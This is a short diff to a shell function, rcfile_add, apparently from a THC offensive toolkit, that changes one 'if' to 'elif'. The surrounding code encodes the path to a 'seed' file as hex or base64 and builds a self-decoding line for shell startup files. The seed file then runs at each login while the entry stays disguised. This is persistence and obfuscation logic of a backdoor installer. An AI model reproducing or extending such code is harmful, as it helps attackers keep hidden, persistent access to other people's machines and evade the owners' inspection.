@@ -55,7 +55,7 @@ rcfile_add()
 		ENC_BIN="$(command -v xxd)"
 		rcline=$(echo "${THC_BASEDIR}"'/seed' |xxd -ps -c1024)
 		RCLINE_ENC="\$(echo $rcline|${ENC_BIN} -r -ps 2>/dev/null)"
-	if [[ "$(echo "thcwashere" | openssl base64 -A 2>/dev/null| openssl base64 -A -d 2>/dev/null)" = "thcwashere" ]]; then
+	elif [[ "$(echo "thcwashere" | openssl base64 -A 2>/dev/null| openssl base64 -A -d 2>/dev/null)" = "thcwashere" ]]; then
 		ENC_BIN="$(command -v openssl)"
 		rcline=$(echo "${THC_BASEDIR}"'/seed' |openssl base64 -A)
 		RCLINE_ENC="\$(echo $rcline|${ENC_BIN} base64 -A -d 2>/dev/null)"
